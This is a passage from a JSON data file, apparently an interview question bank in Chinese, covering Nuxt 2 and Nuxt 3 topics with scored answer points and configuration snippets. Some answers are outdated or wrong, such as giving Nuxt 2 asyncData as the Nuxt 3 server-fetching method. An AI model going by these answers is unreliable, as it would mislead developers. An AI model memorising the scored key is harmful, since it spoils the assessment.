中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","escaped":false}]}]}]}]},{"key":"Nuxt","content":"<h1>Nuxt</h1>\\n<h2>Nuxt.js和Vue.js有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。</li>\\n<li><strong>1：</strong> 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。</li>\\n<li><strong>1：</strong> 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。</li>\\n</ul>\\n<h2>nuxt有哪些特性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。</li>\\n<li><strong>1：</strong> 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。</li>\\n<li><strong>1：</strong> 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。</li>\\n<li><strong>1：</strong> 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。</li>\\n<li><strong>1：</strong> 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。</li>\\n<li><strong>1：</strong> 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。</li>\\n<li><strong>1：</strong> 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。</li>\\n</ul>\\n<h2>nuxt2和nuxt3的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 作为默认的开发服务器和构建工具（也支持 Webpack）。Vite 利用了现代浏览器的原生 ES 模块支持，\\n在开发阶段可以实现更快的冷启动和热更新。例如，当修改一个组件文件时，Nuxt3 + Vite 能够几乎即时地更新页面，而不需要像 <br/>\\n&emsp;Nuxt2（基于 Webpack）那样进行较长时间的重新打包过程。在构建产物方面，Nuxt3 也能够生成更优化的代码，减少不必要的资源加载，从而提升页面加载速度。\\nNuxt2：基于 Webpack 构建，在开发过程中，热更新速度相对较慢。每次更新代码后，Webpack 需要重新构建模块图，这可能导致几秒钟的延迟。在构建用于生产环境的项目时，\\n生成的代码包可能会包含一些冗余代码，影响最终的性能。</li>\\n<li><strong>1：</strong> 目录结构和文件约定：<br/>\\n&emsp;Nuxt3：目录结构更加灵活。它仍然支持传统的pages目录用于定义路由页面，但是引入了新的composables目录用于存放可组合函数，这些函数可以在多个组件之间共享逻辑。\\n例如，你可以在composables目录下创建一个useAuth.js文件，用于处理用户认证逻辑，然后在多个组件中使用这个函数。同时，Nuxt3 对layouts目录的使用也更加灵活，\\n允许更好地定制页面布局。<br/>\\n&emsp;Nuxt2：有比较固定的目录结构，pages目录下的文件直接对应路由，layouts目录主要用于定义页面布局模板，这种结构相对简单直接，但在复杂项目中灵活性稍差。\\n例如，在 Nuxt2 中，如果你想共享一些非路由相关的逻辑，可能需要通过插件或者在store（如果使用 Vuex）中实现，没有像 Nuxt3 的composables这样专门的目录。</li>\\n<li><strong>1：</strong> TypeScript 支持：<br/>\\n&emsp;Nuxt3：对 TypeScript 有更好的原生支持。整个框架的核心代码和 API 都是用 TypeScript 编写的，这使得在开发过程中能够提供更好的类型检查和自动补全功能。\\n例如，在定义组件的props时，TypeScript 能够准确地检查传入属性的类型是否正确，减少运行时错误。并且 Nuxt3 在很多配置文件和插件开发中也更方便地使用 TypeScript，\\n开发体验更加友好。<br/>\\n&emsp;Nuxt2：虽然也可以使用 TypeScript，但需要额外的配置和一些复杂的步骤来实现较好的类型支持。例如，在 Nuxt2 中使用 TypeScript 编写组件时，可能需要手动安\\n装和配置相关的 Babel 插件来处理类型转换，并且在一些插件开发和与 Vuex（如果使用）结合时，TypeScript 的集成度没有 Nuxt3 高。</li>\\n<li><strong>1：</strong> Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。</li>\\n<li><strong>2：</strong> Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。</li>\\n</ul>\\n</details>\\n\\n<h2>Nuxt.js的生命周期有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 服务器端生命周期：</p>\\n<ul>\\n<li>nuxtServerInit：在服务端初始化数据</li>\\n<li>middleware：中间件执行</li>\\n<li>validate()：验证动态路由参数</li>\\n<li>asyncData()：异步数据加载</li>\\n<li>fetch()：服务端数据获取</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> Vue生命周期（服务端）：</p>\\n<ul>\\n<li>beforeCreate：组件实例化之前</li>\\n<li>created：组件创建完成</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> Vue生命周期（客户端）：</p>\\n<ul>\\n<li>beforeMount：DOM挂载之前</li>\\n<li>mounted：DOM挂载完成</li>\\n<li>beforeUpdate：数据更新前</li>\\n<li>updated：数据更新后</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 页面特定钩子：</p>\\n<ul>\\n<li>transition：页面过渡效果</li>\\n<li>head：设置页面元信息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 注意事项：</p>\\n<ul>\\n<li>服务端只能访问beforeCreate和created</li>\\n<li>window/document只能在mounted中使用</li>\\n<li>asyncData/fetch在每次路由变化时都会调用</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Nuxt.js中的数据获取方式有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> asyncData方法：</p>\\n<ul>\\n<li>在组件初始化前调用</li>\\n<li>可以返回Promise</li>\\n<li>返回的数据会合并到组件data中</li>\\n<li>只能在页面组件中使用</li>\\n</ul>\\n<pre><code class=\\"language-js\\">async asyncData({ $axios }) {\\n  const data = await $axios.$get(&#39;/api/data&#39;)\\n  return { data }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> fetch方法：</p>\\n<ul>\\n<li>可在任何组件中使用</li>\\n<li>不直接返回数据</li>\\n<li>通常用于填充Vuex状态</li>\\n</ul>\\n<pre><code class=\\"language-js\\">async fetch() {\\n  const { data } = await this.$axios.$get(&#39;/api/data&#39;)\\n  this.items = data\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> Vuex操作：</p>\\n<ul>\\n<li>nuxtServerInit初始化存储</li>\\n<li>store中的actions获取数据</li>\\n<li>支持模块化管理</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(&#39;/api/data&#39;)\\n    commit(&#39;SET_DATA&#39;, data)\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> API调用最佳实践：</p>\\n<ul>\\n<li>使用@nuxtjs/axios模块</li>\\n<li>统一管理API请求</li>\\n<li>处理错误和加载状态</li>\\n<li>实现数据缓存策略</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Nuxt.js的SEO优化方案有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> Meta标签管理：</p>\\n<pre><code class=\\"language-js\\">head() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: &#39;description&#39;, name: &#39;description&#39;, content: this.description },\\n      { hid: &#39;keywords&#39;, name: &#39;keywords&#39;, content: this.keywords }\\n    ]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 服务端渲染(SSR)：</p>\\n<ul>\\n<li>预渲染完整HTML</li>\\n<li>更好的首屏加载</li>\\n<li>搜索引擎可直接爬取内容</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 静态站点生成(SSG)：</p>\\n<ul>\\n<li>构建时生成静态HTML</li>\\n<li>适合内容不常更新的站点</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  target: &#39;static&#39;,\\n  generate: {\\n    routes: [&#39;/posts/1&#39;, &#39;/posts/2&#39;]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 结构化数据：</p>\\n<ul>\\n<li>实现JSON-LD</li>\\n<li>添加Schema.org标记</li>\\n<li>提供更丰富的搜索结果</li>\\n</ul>\\n<pre><code class=\\"language-js\\">head() {\\n  return {\\n    script: [{\\n      type: &#39;application/ld+json&#39;,\\n      json: {\\n        &quot;@context&quot;: &quot;https://schema.org&quot;,\\n        &quot;@type&quot;: &quot;Article&quot;,\\n        &quot;headline&quot;: this.title\\n      }\\n    }]\\n  }\\n}\\n</code></pre>\\n</li>\\n<li><p><strong>1：</strong> 性能优化：</p>\\n<ul>\\n<li>图片懒加载</li>\\n<li>资源预加载</li>\\n<li>代码分割</li>\\n<li>缓存策略</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n</code></pre>\\n</li>\\n</ul>\\n<h2>如何在 Nuxt.js 中配置和使用环境变量？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如<code>API_URL=&lt;http://localhost:3000/api（开发环境下的&gt; API 地址）</code>。</li>\\n<li><strong>1：</strong> 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">modules: [\\n  &#39;@nuxtjs/dotenv&#39;\\n]\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。</li>\\n</ul>\\n<h2>nuxt2常用的组件有哪些</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> <code>&lt;Nuxt&gt;</code>Nuxt 框架中的核心组件;</p>\\n</li>\\n<li><p><code>&lt;NuxtLink&gt;</code>用于在 Nuxt 应用内部进行页面导航;</p>\\n</li>\\n<li><p><code>&lt;ClientOnly&gt;</code>只在客户端被渲染和执行;</p>\\n</li>\\n<li><p><code>&lt;NoSSR&gt;</code>用来处理不适合在服务端渲染的内容;</p>\\n</li>\\n<li><p><code>&lt;Transition&gt;</code>用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。</p>\\n</li>\\n<li><p><strong>1：</strong> <code>&lt;NuxtChild&gt;</code>主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;</p>\\n</li>\\n<li><p><code>&lt;KeepAlive&gt;</code>保留组件的状态，让它在切换后依然保持之前的状态;</p>\\n</li>\\n<li><p><code>&lt;slot&gt;</code>用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.</p>\\n</li>\\n</ul>\\n<h2>nuxt3常用的组件有哪些</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> <code>&lt;NuxtPage&gt;</code>类似于 Nuxt2 中的Nuxt组件，是 Nuxt3 里用于渲染当前路由对应的页面组件的核心组件、</p>\\n</li>\\n<li><p><code>&lt;NuxtLink&gt;</code>用于在 Nuxt 应用内部进行页面导航；</p>\\n</li>\\n<li><p><code>&lt;ClientOnly&gt;</code>只在客户端被渲染和执行；</p>\\n</li>\\n<li><p><code>&lt;Transition&gt;</code>用于给页面或组件的切换添加过渡动画效果；</p>\\n</li>\\n<li><p><code>&lt;KeepAlive&gt;</code>保留组件的状态，让它在切换后依然保持之前的状态；</p>\\n</li>\\n<li><p><code>&lt;Suspense&gt;</code>在 Nuxt3 中用于处理异步组件的加载状态，特别是当组件需要等待一些异步操作（如异步获取数据、加载外部脚本等）完成后才能正确渲染时，Suspense 可以显示一个\\n占位内容（如加载提示信息），直到异步操作结束，组件成功渲染，从而提供更好的用户体验，避免页面出现长时间空白等情况；</p>\\n</li>\\n<li><p><strong>1：</strong> <code>&lt;NuxtLayout&gt;</code>用于指定页面所使用的布局。在 Nuxt3 中，可以创建多个不同的布局文件（.vue格式，定义了不同的页面结构样式），然后通过NuxtLayout组件来选\\n择具体使用哪一个布局来呈现页面。这为实现多样化的页面布局设计提供了便利，满足不同页面在结构、样式等方面的差异化需求;</p>\\n</li>\\n<li><p><code>&lt;NoSSR&gt;</code>用来处理不适合在服务端渲染的内容；</p>\\n</li>\\n<li><p><code>&lt;slot&gt;</code>用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容；</p>\\n</li>\\n<li><p><code>&lt;NuxtImg&gt;</code>；</p>\\n</li>\\n<li><p><code>&lt;NuxtPicture&gt;</code>。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>在 Nuxt3 中，怎样在服务端获取数据并传递给页面组件？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 可以使用 asyncData 或 fetch 方法。在页面组件中，asyncData 是一个异步函数，接收上下文 ctx，在其中获取数据后返回一个对象，该对象会与组件的\\n data 合并；fetch 方法类似，但数据存储在组件实例的 $fetchState 中，例如在 asyncData 中：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export default { \\n async asyncData(ctx) { \\n   const data = await ctx.$axios.get(&#39;/api/data&#39;); \\n   return { \\n     fetchedData: data \\n   }; \\n } \\n}\\n</code></pre>\\n<h2>Nuxt3 的路由懒加载是如何实现的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Nuxt3 基于 Vue Router 的懒加载功能，通过动态导入组件实现路由懒加载。</li>\\n<li><strong>1：</strong> 在定义路由时，使用箭头函数返回 <code>import()</code> 导入的组件，例如 <code>{ path: &#39;/about&#39;, component: () =&gt; import(&#39;~/pages/About.vue&#39;) }</code>，这样在访问路\\n由时才会加载对应的组件代码，提高初始加载性能。</li>\\n</ul>\\n<h2>Nuxt3 中如何定义全局样式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 nuxt.config.ts 中通过 css 数组添加全局样式文件路径,如： <code>[&#39;~/assets/css/global.css&#39;]</code>, 使样式在整个应用中生效。</li>\\n</ul>\\n<h2>请解释 Nuxt3 中 nitro 的作用及关键配置项</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> nitro 负责 Nuxt3 服务器端构建与部署核心支撑、服务端渲染（SSR）及性能优化、灵活的路由处理与适配、跨平台与多环境适配</li>\\n<li><strong>1：</strong> 指定服务器的预设模式，决定了 Nuxt3 应用最终如何构建以及适配何种类型的运行环境。例：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    preset: &#39;node-server&#39;\\n  }\\n}\\n//在上述配置中，选择 node-server 预设，表示应用将以适合在传统 Node.js 服务器上运行的方式进行构建，生成对应的可执行代码和相关配置。如果设置为 serverless，\\n// 例如 preset: &#39;serverless&#39;，则会按照无服务器架构的要求对应用进行构建，以便能够部署到像 AWS Lambda 这样的无服务器环境中，nitro 会自动处理相关的代码打包、资源管理等差异，确保应用正常运行。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> routeRules,用于详细定义各个路由的规则，涵盖缓存策略、重定向规则、响应头设置等方面，能够根据具体的业务需求对不同路由进行定制化配置，优化路由相关的性能和用户访问逻辑。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    routeRules: {\\n      &#39;/&#39;: {\\n        cache: {\\n          maxAge: 60 * 10 // 为首页设置缓存时间，这里是 10 分钟\\n        }\\n      },\\n      &#39;/about&#39;: {\\n        redirect: {\\n          destination: &#39;/&#39;, // 将访问 /about 页面重定向到首页\\n          statusCode: 302\\n        }\\n      },\\n      &#39;/api/data&#39;: {\\n        headers: {\\n          &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39; // 为 /api/data 路由设置响应头，允许跨域访问\\n        }\\n      }\\n    }\\n  }\\n}\\n//在这个示例中，针对应用的根路由（/）设置了缓存策略，即用户首次访问后，在接下来的 10 分钟内再次访问该页面时，服务器可以直接从缓存中获取页面内容并返回，减\\n// 少服务器处理负担；对于 /about 页面配置了重定向规则，当用户访问该页面时会以 302 状态码重定向到首页；而 /api/data 路由则通过设置响应头，解决了该路由的跨域访问问题，方便前端与之交互。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> devProxy, 主要在开发环境中发挥作用，用于配置代理服务器，将前端应用发出的请求代理转发到指定的后端服务器地址，以此巧妙地解决开发过程中常见的跨域问题，使得前后端能够在本地\\n开发环境下顺畅地协同工作。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    devProxy: {\\n      &#39;/api&#39;: {\\n        target: &#39;http://localhost:3000/api&#39;, // 后端 API 服务器的实际地址\\n        changeOrigin: true\\n      }\\n    }\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> output, 可以对构建输出的相关参数进行配置，包括指定构建输出的目录、公共资源目录的设置、确定模块格式等内容，让开发者能够根据项目的实际部署需求以及目标环境的\\n要求，精准地定制构建结果的呈现形式。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    output: {\\n      dir: &#39;dist&#39;, // 设置构建输出目录为 dist\\n      publicDir: &#39;public&#39;, // 设定公共资源目录为 public\\n      format: &#39;esm&#39; // 设置模块格式为 ESM（ECMAScript 模块），也可根据需求选择其他格式\\n    }\\n  }\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> plugins, 允许开发者在 nitro 的构建流程中引入自定义的插件，这些插件能够扩展 nitro 的功能，执行诸如在服务器启动时初始化特定资源、修改请求和响应处理逻辑、与外部\\n系统进行集成等操作，从而为服务器端应用增添更多的灵活性和可定制性。</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">// nuxt.config.ts\\nexport default {\\n  nitro: {\\n    plugins: [&#39;./server/plugins/myPlugin.ts&#39;]\\n  }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>请说明 Nuxt 中插件（plugin）的作用以及如何编写和使用一个自定义插件？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>3：</strong> Nuxt 插件的作用<br/>\\n&emsp;功能扩展：Nuxt 插件可以用来向项目中添加各种额外的功能，这些功能可能是 Nuxt 核心框架本身没有提供，但在实际项目开发中经常需要的。例如，集成第三方库（像引\\n入 axios 用于网络请求）、添加全局的混入（mixins）、注入全局的方法或属性等，以此增强项目的整体功能。<br/>\\n&emsp;全局共享：插件能够在整个 Nuxt 项目的多个页面和组件之间实现功能的全局共享。一旦在项目中配置并注册了插件，其提供的功能就可以在不同的组件中方便地调用，无需在\\n每个组件内部重复编写相同的逻辑，有助于提高代码的复用性和可维护性。<br/>\\n&emsp;优化配置：通过插件还可以对 Nuxt 项目进行一些底层的优化配置。比如，可以在插件里配置全局的 CSS 样式加载、设置浏览器的一些特性等，使得项目在运行时能更好地\\n适配不同的环境和满足特定的需求。</li>\\n<li><strong>2：</strong> 编写一个自定义插件<br/>\\n&emsp;在 Nuxt 项目的 plugins 目录下创建一个新的 JavaScript 文件，文件名可以根据插件的功能自行命名，例如 myPlugin.js。如果 plugins 目录不存在，则需要手动创建。<br/>\\n&emsp;在插件文件中，按照以下格式编写代码。插件本质上是一个函数，它接收两个参数 context 和 inject（这两个参数由 Nuxt 自动传入）。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">export default function (context, inject) {\\n  const myLogger = (message) =&gt; {\\n    console.log(`[MyLogger] ${message}`);\\n  };\\n  inject(&#39;myLogger&#39;, myLogger);\\n}\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# Nuxt\\n\\n","depth":1,"text":"Nuxt","tokens":[{"type":"text","raw":"Nuxt","text":"Nuxt","escaped":false}]},{"type":"heading","raw":"## Nuxt.js和Vue.js有什么区别？\\n\\n","depth":2,"text":"Nuxt.js和Vue.js有什么区别？","tokens":[{"type":"text","raw":"Nuxt.js和Vue.js有什么区别？","text":"Nuxt.js和Vue.js有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。\\n* **1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。\\n* **1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。\\n","task":false,"loose":false,"text":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","tokens":[{"type":"text","raw":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","text":"**1：** 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","text":" 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。\\n","task":false,"loose":false,"text":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","tokens":[{"type":"text","raw":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","text":"**1：** 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","text":" 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","task":false,"loose":false,"text":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","tokens":[{"type":"text","raw":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","text":"**1：** 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 